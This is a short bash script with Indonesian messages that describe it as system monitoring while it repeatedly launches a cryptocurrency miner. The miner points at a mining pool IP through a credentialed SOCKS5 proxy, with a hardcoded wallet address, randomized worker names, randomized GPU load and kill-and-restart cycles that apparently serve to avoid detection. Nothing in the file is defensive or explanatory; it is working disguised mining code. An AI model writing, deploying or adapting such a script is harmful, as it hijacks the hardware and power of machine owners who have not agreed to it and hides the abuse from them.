#!/bin/bash

echo "Memulai sistem monitoring dengan penggunaan GPU berubah setiap detik..."

while true; do
    # Acak penggunaan GPU antara 50-70% setiap detik
    gpu_power=$((RANDOM % 21 + 50))

    echo "Memeriksa kinerja sistem dengan $gpu_power% power GPU"

    # Jalankan miner dengan parameter acak
    ./peak --coin pearl --url 192.210.169.184:80 --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999999) --proxy socks5://Bahlilganteng:Bahlilganteng@198.144.189.25:443 --gpu-power=$gpu_power --max-threads=2 &

    # Tunggu 1 detik (akan berubah setiap detik)
    echo "Menunggu 1 detik..."
    sleep 1

    # Hentikan proses mining
    pkill -f peak
    echo "Pemeriksaan selesai"

    # Tunggu sebentar sebelum restart
    echo "Menunggu 2 detik sebelum restart..."
    sleep 2
done
